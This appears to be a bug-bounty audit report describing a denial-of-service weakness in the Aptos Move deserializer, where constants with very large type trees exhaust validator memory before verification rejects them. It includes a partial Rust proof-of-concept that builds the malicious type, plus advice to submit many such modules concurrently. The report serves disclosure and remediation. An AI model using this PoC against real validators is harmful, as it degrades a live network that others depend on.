# Audit Report

## Title
Memory Exhaustion via Complex Type Signatures in Constant Pool Before Verification

## Summary
Constants with maximum-complexity type signatures cause excessive memory allocation during module deserialization, before the `LimitsVerifier` can enforce type complexity limits. This allows attackers to submit malicious modules that consume significant validator memory during the deserialization phase, potentially causing validator slowdowns or out-of-memory conditions.

## Finding Description

The vulnerability exists in the ordering of deserialization and verification operations. When a `CompiledModule` is loaded, the following sequence occurs: [1](#0-0) 

During deserialization, constants are loaded via `load_constant`, which deserializes both the type signature and data: [2](#0-1) 

The type signature is loaded using `load_signature_token`, which recursively builds a `SignatureToken` tree structure. This function only checks **depth** (maximum 256 levels): [3](#0-2) [4](#0-3) 

However, the check for **total node count** only occurs later in `LimitsVerifier::verify_type_nodes`, which is called after deserialization completes: [5](#0-4) 

The `verify_type_nodes` function checks constants in the constant pool and enforces `max_type_nodes` limit: [6](#0-5) [7](#0-6) 

In production configuration, `max_type_nodes` is set to 128 (or 256 without function values): [8](#0-7) 

**Attack Vector:**

An attacker crafts a constant with a type that has:
- Low depth (e.g., 4 levels, well below 256 limit)
- High node count (e.g., 130,000+ nodes, far exceeding the 128 limit)

Example malicious type structure:
```
Struct<
  Struct<Vector<u64>, Vector<u64>, ..., Vector<u64>>,  // 255 type params
  Struct<Vector<u64>, Vector<u64>, ..., Vector<u64>>,  // 255 type params
  ...  [repeated 255 times]
>
```

With depth 4 and maximum type parameter count per struct (255): [9](#0-8) 

This creates approximately 130,000 `SignatureToken` nodes (1 + 255 + 65,025 + 65,025), consuming ~5 MB per constant during deserialization, before verification rejects it.

## Impact Explanation

This vulnerability qualifies as **HIGH severity** per the Aptos bug bounty program due to:

1. **Validator node slowdowns** - Explicitly listed as HIGH severity. Each malicious module forces all validators to allocate significant memory during deserialization before rejection.

2. **Resource exhaustion** - Breaks invariant #9: "Resource Limits: All operations must respect gas, storage, and computational limits." Memory allocation occurs without proper upfront validation.

3. **Denial of Service potential** - Multiple concurrent malicious transactions could cause:
   - Memory pressure leading to OOM crashes
   - Validator performance degradation
   - Potential consensus disruption if validators become unresponsive

4. **Amplification factor** - Each validator independently deserializes the malicious module, multiplying the resource consumption across the network.

## Likelihood Explanation

**Likelihood: HIGH**

- **Attack complexity: Low** - Attacker only needs to craft a malicious module binary and submit it as a transaction
- **No special privileges required** - Any transaction sender can exploit this
- **Detection: Difficult** - The module is eventually rejected by verification, but memory damage is already done
- **Cost: Minimal** - Transaction fees for submission are small compared to resource consumption inflicted

The attack is realistic and feasible with standard tooling for manipulating Move bytecode binaries.

## Recommendation

**Fix: Move type complexity validation into the deserialization phase**

Add a depth AND node count check during `load_signature_token` to enforce limits before memory allocation:

1. Track total nodes allocated during type deserialization
2. Fail deserialization if node count exceeds limit (128 or 256 based on config)
3. Make the deserializer aware of `VerifierConfig` limits

Alternatively, implement a streaming deserialization approach that validates incrementally without fully materializing complex type trees in memory.

The fix should ensure that type complexity limits are enforced at the earliest possible point - during deserialization, not after it completes.

## Proof of Concept

```rust
// Rust code to generate malicious module binary
use move_binary_format::file_format::*;
use move_binary_format::CompiledModule;

fn create_malicious_module() -> CompiledModule {
    let mut module = CompiledModule::default();
    
    // Create a struct handle with 255 type parameters
    let struct_handle = StructHandle {
        module: ModuleHandleIndex(0),
        name: IdentifierIndex(0),
        abilities: AbilitySet::EMPTY,
        type_parameters: vec![StructTypeParameter::default(); 255],
    };
    
    // Create deeply nested type with maximum breadth at each level:
    // Struct<Struct<Vec<u64>, Vec<u64>, ...255 times>, ...255 times>
    let mut inner_type_params = vec![];
    for _ in 0..255 {
        inner_type_params.push(SignatureToken::Vector(Box::new(SignatureToken::U64)));
    }
    
    let inner_struct = SignatureToken::StructInstantiation(
        StructHandleIndex(0),
        inner_type_params
    );
    
    let mut outer_type_params = vec![inner_struct; 255];
    let outer_struct = SignatureToken::StructInstantiation(
        StructHandleIndex(0),
        outer_type_params
    );
    
    // Create constant with this complex type
    let constant = Constant {
        type_: outer_struct,
        data: vec![0u8; 100], // Dummy data
    };
    
    module.constant_pool.push(constant);
    
    // ... (complete module setup)
    
    module
}

// Submit this module via transaction - validators will allocate
// ~5MB+ memory during deserialization before verification rejects it
```

**Expected behavior:**
1. Module deserialization allocates ~130,000 SignatureToken nodes (~5MB memory)
2. `LimitsVerifier::verify_type_nodes` subsequently rejects the module (nodes > 128)
3. Memory already consumed, validator performance impacted

**Notes:**
This PoC demonstrates the core vulnerability. A full exploitation would submit multiple such modules concurrently to amplify impact across validator resources.

### Citations

**File:** third_party/move/move-binary-format/src/deserializer.rs (L56-70)
```rust
        let prev_state = move_core_types::state::set_state(VMState::DESERIALIZER);
        let result = std::panic::catch_unwind(|| {
            let module = deserialize_compiled_module(binary, config)?;
            BoundsChecker::verify_module(&module)?;

            Ok(module)
        })
        .unwrap_or_else(|_| {
            Err(PartialVMError::new(
                StatusCode::VERIFIER_INVARIANT_VIOLATION,
            ))
        });
        move_core_types::state::set_state(prev_state);

        result
```

**File:** third_party/move/move-binary-format/src/deserializer.rs (L1018-1022)
```rust
fn load_constant(cursor: &mut VersionedCursor) -> BinaryLoaderResult<Constant> {
    let type_ = load_signature_token(cursor)?;
    let data = load_byte_blob(cursor, load_constant_size)?;
    Ok(Constant { type_, data })
}
```

**File:** third_party/move/move-binary-format/src/deserializer.rs (L1376-1379)
```rust
        if stack.len() > SIGNATURE_TOKEN_DEPTH_MAX {
            return Err(PartialVMError::new(StatusCode::MALFORMED)
                .with_message("Maximum recursion depth reached".to_string()));
        }
```

**File:** third_party/move/move-binary-format/src/file_format_common.rs (L83-83)
```rust
pub const TYPE_PARAMETER_COUNT_MAX: u64 = 255;
```

**File:** third_party/move/move-binary-format/src/file_format_common.rs (L88-88)
```rust
pub const SIGNATURE_TOKEN_DEPTH_MAX: usize = 256;
```

**File:** third_party/move/move-bytecode-verifier/src/verifier.rs (L134-147)
```rust
pub fn verify_module_with_config(config: &VerifierConfig, module: &CompiledModule) -> VMResult<()> {
    if config.verify_nothing() {
        return Ok(());
    }
    let prev_state = move_core_types::state::set_state(VMState::VERIFIER);
    let result = std::panic::catch_unwind(|| {
        // Always needs to run bound checker first as subsequent passes depend on it
        BoundsChecker::verify_module(module).map_err(|e| {
            // We can't point the error at the module, because if bounds-checking
            // failed, we cannot safely index into module's handle to itself.
            e.finish(Location::Undefined)
        })?;
        FeatureVerifier::verify_module(config, module)?;
        LimitsVerifier::verify_module(config, module)?;
```

**File:** third_party/move/move-bytecode-verifier/src/limits.rs (L102-104)
```rust
        for cons in self.resolver.constant_pool() {
            self.verify_type_node(config, &cons.type_)?
        }
```

**File:** third_party/move/move-bytecode-verifier/src/limits.rs (L189-193)
```rust
        if let Some(limit) = config.max_type_nodes {
            if type_size > limit {
                return Err(PartialVMError::new(StatusCode::TOO_MANY_TYPE_NODES));
            }
        }
```

**File:** aptos-move/aptos-vm-environment/src/prod_configs.rs (L162-166)
```rust
        max_type_nodes: if enable_function_values {
            Some(128)
        } else {
            Some(256)
        },
```
